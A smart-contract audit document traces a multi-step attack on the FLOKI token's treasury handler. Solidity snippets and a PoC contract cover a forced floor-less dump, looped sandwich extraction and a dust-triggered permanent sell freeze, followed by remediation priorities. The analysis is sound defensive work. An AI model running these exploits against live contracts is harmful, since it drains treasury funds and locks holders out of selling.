# FLOKI Token — End-to-End Kill Chain

**Companions:** [`TOKENOMIC_SECURITY_AUDIT.md`](./TOKENOMIC_SECURITY_AUDIT.md),
[`ESCALATION_CHAINS.md`](./ESCALATION_CHAINS.md)
**Commit:** `bbfd130`
**Question addressed:** can a single unprivileged actor start from one small bug and *hop* through
others, escalating impact at each hop, in one campaign?

Yes. This document walks **one attacker, one session**, through six hops — from reading public state
to draining the treasury to sealing the exit behind a permanent sell freeze. Each hop names the bug,
the exact line, the state it changes, and **the mechanism that hands control to the next bug** (the
"→ JUMP"). No owner privileges are used anywhere in the primary chain.

> **Verification note.** All FLOKI/handler line references are checked against this repo. Statements
> about `UniswapV2Router02` / `UniswapV2Pair` internals are reasoned from the canonical published
> source (`node_modules` is not installed here).

> **Refined in the deep dive.** HOPs 2-3 below present the extraction as a simple
> "sell → trigger → buy" atomic sandwich. Because the treasury hook is a *pre-transfer* hook, the
> first forced dump actually prices at ~fair value, and the anti-whale tax forces the attacker into
> split sells — so the real extraction is driven by the *later* tranches after the price is walked
> down. [`ATTACK_CHAIN_DEEPDIVE.md`](./ATTACK_CHAIN_DEEPDIVE.md) traces the corrected mechanism at
> the EVM level with a worked P&L. The conclusion here is unchanged.

---

## Threat model

- **Attacker:** any externally-owned account. No role, no allowance, no prior interaction.
- **Capital:** enough FLOKI to move the pool price a few percent for the sandwich leg — optionally
  flash-borrowed, so the true at-risk capital is ~two swap fees. Phase B needs only gas + dust.
- **Precondition:** the token is live and configured the normal way — pools registered,
  `primaryPool` set, `ExponentialTaxHandler` + `TreasuryHandlerAlpha` installed (the exact end-state
  of `scripts/deploy-floki.ts`). The treasury handler has accumulated some tax FLOKI, which happens
  automatically from ordinary trading. **Nothing about the attack requires a misconfiguration.**

---

## The chain at a glance

```
 HOP 0            HOP 1              HOP 2            HOP 3             HOP 4            HOP 5
 recon    →    forced dump    →    sandwich    →    amplify     →    (exit clean)  →  permafreeze
 public        C-01 no auth        H-01 min=0      M-01 split +      profit taken     X-01 dust +
 state         on the hook         on the swap     lenient guard     in ETH           L-01 + H-04
   │               │                   │               │                                  │
   │   getExchange │  beforeTransfer   │  treasury     │  N dumps per tx  │  drain complete │  send 3 wei,
   │   Pools(),    │  Handler(0,POOL,0)│  sells at YOUR │  because guard   │                 │  sells revert
   └─ primaryPool ─┘  runs the dump  ──┘  price, 0 floor┘  resets between ─┘                 └─ forever
                                                            sequential calls
```

Read that top row left to right: **a missing modifier becomes a floor-less swap becomes a repeatable
loop becomes a drained treasury becomes a bricked token.** Each arrow is a specific line of code.

---

## HOP 0 — Reconnaissance (no bug, just public state)

Everything the attack needs is a `view` call away.

```solidity
address[] memory pools = handler.getExchangePoolAddresses();   // ExchangePoolProcessor.sol:33
address pool           = handler.primaryPool();                // ExchangePoolProcessor.sol:18
uint256 impactBps      = treasury.priceImpactBasisPoints();    // 300 by deploy default
uint256 treasuryBag    = token.balanceOf(address(treasury));   // the prize
```

The attacker now knows the pool address, the sell cap (3% of pool reserve per trigger), and exactly
how much FLOKI is sitting in the treasury waiting to be dumped. **→ JUMP:** the pool address is the
only argument the next bug needs.

---

## HOP 1 — Forced treasury dump — **C-01** (`TreasuryHandlerAlpha.sol:77`)

```solidity
function beforeTransferHandler(
    address benefactor,
    address beneficiary,
    uint256 amount
) external nonReentrant {        // ← external, no onlyToken, no auth of any kind
    benefactor;                  // ignored (line 83)
    amount;                      // ignored (line 84)
    if (!_exchangePools.contains(beneficiary)) { return; }   // the ONLY gate — and it's public data
    ...
```

The attacker calls it directly:

```solidity
treasury.beforeTransferHandler(address(0), pool, 0);
```

`benefactor` and `amount` are discarded, so the attacker supplies junk. `beneficiary = pool` passes
the only check. The body proceeds to sell `min(treasuryBag, 3% of pool reserve)` of FLOKI for ETH.

On its own this is a griefing primitive — the attacker can force the treasury to trade at a moment
of the attacker's choosing, paying the 0.3% LP fee and its own price impact on the treasury's behalf,
for the cost of gas. But forcing the *timing* is only step one. **→ JUMP:** the dump inside this hook
executes a router swap — and that swap has no price floor.

---

## HOP 2 — The dump has no floor — **H-01** (`TreasuryHandlerAlpha.sol:234`)

Inside the hook, the sale runs through:

```solidity
function _swapTokensForEth(uint256 tokenAmount) private {
    ...
    router.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount,
        0,              // ← amountOutMin: the treasury accepts ANY amount of ETH, including ~0
        path,
        address(this),
        block.timestamp // ← deadline is always "now", i.e. no deadline
    );
}
```

`amountOutMin = 0` means the treasury will complete the sale **at whatever price the pool happens to
be at when this line runs** — and the attacker controls that price, because HOP 1 let them choose
*when* it runs. Wrap the trigger in a sandwich, atomically, in one transaction:

```solidity
// 1. FRONT-RUN: sell FLOKI, pushing the pool price down.
router.swapExactTokensForETHSupportingFeeOnTransferTokens(aFloki, 0, [FLOKI, WETH], me, now);

// 2. TRIGGER: force the treasury to sell INTO the depressed price, with no floor (HOP 1 → HOP 2).
treasury.beforeTransferHandler(address(0), pool, 0);

// 3. BACK-RUN: buy FLOKI back. The treasury's dump pushed price down further, so the same ETH
//    now buys back MORE FLOKI than step 1 sold.
router.swapExactETHForTokensSupportingFeeOnTransferTokens{...}(0, [WETH, FLOKI], me, now);
```

**Why this profits (constant-product sketch, fees omitted for intuition):** let the attacker sell
`a` FLOKI in step 1 for `e₁` ETH. The treasury then sells `T` FLOKI for `e₂` ETH — that ETH leaves
the pool to the treasury address, dropping the FLOKI price further. In step 3 the attacker spends
`e₁` back and receives `f₃` FLOKI. Because the treasury's sale cheapened FLOKI between the legs,
`f₃ > a`: the attacker ends **ETH-neutral and holding more FLOKI than they started with.** That
surplus `(f₃ − a)` is drawn from the FLOKI the treasury deposited at a throwaway price. The treasury
converted `T` FLOKI (fair value ≈ `T · price`) into a tiny `e₂`; the difference is split between the
attacker's surplus and the passive LPs, with `amountOutMin = 0` guaranteeing there is no lower bound
on how bad `e₂` gets.

**→ JUMP:** one sandwich skims one capped dump (3% of pool). To take *all* of the treasury's bag in
a single transaction, the attacker needs the dump to fire many times — and the reentrancy guard was
built to let exactly that happen.

---

## HOP 3 — Amplify to N dumps per transaction — **M-01 + lenient guard** (`LenientReentrancyGuard.sol:37-48`)

The naive assumption is that `nonReentrant` caps the attacker at one dump per transaction. It does
not, because the guard protects against *nested* calls, not *sequential* ones:

```solidity
modifier nonReentrant() {
    if (_status == _ENTERED) { return; }   // nested call: silently returns (does nothing)
    _status = _ENTERED;
    _;
    _status = _NOT_ENTERED;                // ← reset at the END of every completed call
}
```

After each `beforeTransferHandler` returns, `_status` is back to `_NOT_ENTERED`. So the attacker
issues the trigger **sequentially** inside one transaction, and every one fires:

```solidity
for (uint i = 0; i < N; i++) {
    router.swapExactTokensForETHSupportingFeeOnTransferTokens(chunk, 0, [FLOKI, WETH], me, now);
    // each chunk sold to `pool` re-enters FLOKI._transfer → beforeTransferHandler → a FRESH dump,
    // because the guard reset after the previous one.
    treasury.beforeTransferHandler(address(0), pool, 0);
}
router.swapExactETHForTokensSupportingFeeOnTransferTokens{...}(0, [WETH, FLOKI], me, now); // close
```

This is the same primitive that M-01 flagged for *tax evasion* (splitting a whale sell to dodge the
81% tier) — repurposed as an *extraction multiplier*. Each iteration forces another capped dump at
another attacker-set price. `N` iterations drain up to `N × 3%` of the pool's worth of treasury FLOKI
in a single atomic transaction, each tranche floor-less thanks to HOP 2.

Note the interaction with **M-02**: because the treasury sale executes *before* the router prices the
attacker's own leg, the attacker isn't even fighting the mechanism — the design front-runs on the
attacker's behalf.

**→ JUMP:** the transaction lands, the attacker is ETH-neutral and FLOKI-heavy (or dumps the surplus
FLOKI for clean ETH in the same tx). The treasury bag is gone. Now the attacker seals the exit.

---

## HOP 4 — Exit clean

Nothing to exploit here — the attacker simply converts the `(f₃ − a)` FLOKI surplus to ETH (or repays
the flash loan and keeps the delta). The treasury's accumulated tax revenue has been transferred, via
a floor-less forced sale, into the attacker's wallet and the LPs' reserves. **The chain has already
achieved Critical impact.** HOP 5 is the twist of the knife.

---

## HOP 5 — Seal the token behind a permanent sell freeze — **X-01 (L-01 + no swap threshold + H-04)**

The attacker has exited. To trap everyone still holding — creating panic that (if the attacker still
holds any FLOKI or a short position elsewhere) they profit from, or simply as scorched earth — they
lock the sell path with a single dust transfer:

```solidity
token.transfer(address(treasury), 3);   // 3 base units. Untaxed wallet transfer. ~21k gas.
```

Now trace what every subsequent seller triggers (`TreasuryHandlerAlpha.sol:91-117`), with
`liquidityBasisPoints = 2000` from the deploy script:

```solidity
uint256 contractTokenBalance = token.balanceOf(address(this));   // = 3
if (contractTokenBalance > 0) {                                  // 3 > 0 → TRUE (the L-01 trap door)
    // cap doesn't bind; 3 is far below 3% of the pool
    uint256 tokensForLiquidity = (3 * 2000) / 20000;             // = 0
    uint256 tokensForSwap      = 3 - 0;                          // = 3
    _swapTokensForEth(3);                                        // → router → pair.swap(...)
    // getAmountOut(3, hugeReserve, hugeReserve) truncates to 0 →
    // UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT → REVERT
```

The revert propagates: `pair.swap` → `router` → `_swapTokensForEth` → `beforeTransferHandler` →
`FLOKI._transfer` → **the seller's `transferFrom` reverts.** Every holder's sell now fails. Buys
still succeed (the hook returns early for non-pool beneficiaries, line 87-89). Wallet transfers still
succeed. **Buys work, sells revert — a honeypot, armed permanently by an outsider for 3 wei of
token.**

And it cannot be cleared without owner intervention, because **H-04** (`:210-213`) forbids
withdrawing the accumulating token:

```solidity
require(tokenAddress != address(token),
    "TreasuryHandlerAlpha:withdraw:INVALID_TOKEN: Not allowed to withdraw token required for swaps.");
```

- Sell the dust? That *is* the reverting operation.
- Lower `priceImpactBasisPoints`? Clamps the amount to 0 → reverts on FLOKI's own `require(amount > 0)`.
- `withdraw` the dust? Blocked by the line above.
- Only escape: the **owner** calls `FLOKI.setTreasuryHandler(newHandler)`, abandoning all future tax
  accrual — and if ownership was ever renounced (**M-07 / X-07**), even that door is gone: **total,
  permanent, irreversible sell freeze.**

---

## The whole chain as a PoC sketch

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

interface IFloki { function transfer(address,uint256) external returns (bool); }
interface ITreasury { function beforeTransferHandler(address,address,uint256) external; }
interface IRouter { /* swap functions */ }

contract FlokiKillChain {
    IFloki   floki;   ITreasury treasury;   IRouter router;   address pool;   address weth;

    // Phase A — atomic drain. Optionally funded by a flash loan of ETH/FLOKI.
    function drain(uint256 n, uint256 chunk) external {
        for (uint256 i = 0; i < n; i++) {
            _sell(chunk);                                   // HOP 2 front-run leg (price down)
            treasury.beforeTransferHandler(address(0), pool, 0);  // HOP 1 → HOP 2 → HOP 3: forced, floor-less dump
        }
        _buyBackAll();                                      // close the sandwich; keep the surplus
    }

    // Phase B — scorched earth. Call after exiting.
    function permafreeze() external {
        floki.transfer(address(treasury), 3);               // HOP 5: X-01 dust → all sells revert forever
    }

    function _sell(uint256) internal { /* swapExactTokensForETH..., amountOutMin arg is OUR choice */ }
    function _buyBackAll() internal { /* swapExactETHForTokens... */ }
}
```

Two transactions (or one, if `drain` and `permafreeze` are merged and the attacker exits via a flash
loan): **treasury drained, then token bricked.**

---

## Impact

| Dimension | Result |
|---|---|
| Treasury tax revenue | Fully extractable per campaign; `amountOutMin = 0` sets no floor on the loss |
| Per-transaction reach | `N × priceImpactBasisPoints` of the pool (3% × N at deploy defaults) |
| Attacker capital at risk | ~2 swap fees on the sandwiched size (flash-loanable to near-zero) |
| Privileges required | **None.** Every call in the primary chain is permissionless |
| Aftermath | Optional permanent sell freeze on the entire holder base for 3 wei |
| Reversibility of the freeze | Owner-only (`setTreasuryHandler`); **irreversible** if ownership renounced |

---

## Where the chain breaks — and the one fix that breaks it best

This is the payoff of laying the chain out as a sequence: you can see which single fix severs the
most links.

| Fix | HOP 1 | HOP 2 | HOP 3 | HOP 5 | Chain outcome |
|---|:---:|:---:|:---:|:---:|---|
| `onlyToken` on the hook (C-01) | ✅ blocks forced trigger | — | ✅ blocks forced loop | — | **Weakened, not broken.** Attacker loses the ability to *force* the dump, but can still sandwich an *organic* sell — the dump still has no floor. And HOP 5 is untouched. |
| **TWAP-anchored `amountOutMin` (H-01)** | — | ✅ **kills the profit** | ✅ **kills the profit** | — | **Extraction chain broken.** With a real price floor, the treasury's forced sale can no longer be underpriced, so HOPs 1→3 stop producing profit regardless of who triggers them. This is the single highest-value fix. |
| Non-zero `minimumSwapThreshold` + fail-soft hook (X-01) | — | — | — | ✅ blocks the freeze | **Only HOP 5 dies.** Extraction still works. |
| Allow token withdrawal (H-04) | — | — | — | ⚠️ makes freeze recoverable | Freeze becomes clearable by the owner, but still a live DoS. |

**Conclusion for remediation:** `onlyToken` (the intuitive "add access control" fix) is necessary
but does **not** break the money chain — HOP 2's `amountOutMin = 0` is load-bearing, and an organic
sell is a good-enough trigger without HOP 1. **Fix H-01 first.** Then C-01 to remove the forced
timing, then X-01 to close the freeze. This matches the reordered priority list in
[`ESCALATION_CHAINS.md`](./ESCALATION_CHAINS.md#9-revised-remediation-order), and the kill chain is
the reason for the ordering.

---

## Appendix — the owner-side kill chain (one transaction, total loss)

For completeness, the privileged path is shorter and strictly more powerful, and it reuses the same
unbounded-handler hinge (**C-02**):

```
 setTaxHandler(honeypot)  →  honeypot.getTax(seller,pool,x) returns x  →  every sell sends 100%
 (Floki.sol:312, no bound,     (arbitrary code, unbounded return,          to the treasury handler;
  no timelock, no event delay)  Floki.sol:447)                            owner exits at 0%
```

One transaction converts the token into a 100%-sell-tax honeypot while the owner sells freely; a
variant returning `amount + 1` underflows `Floki.sol:448` into an invisible per-address freeze. No
chain of small bugs needed — this is a single Critical by itself (C-02) — but it shares HOP 5's
sealing move and the same renounce-to-make-permanent amplifier (X-07). The defense is the
`MAX_TAX_BASIS_POINTS` ceiling enforced *inside* `FLOKI._transfer`, which caps every handler present
or future and is the reason that fix is rated so highly in the main report.
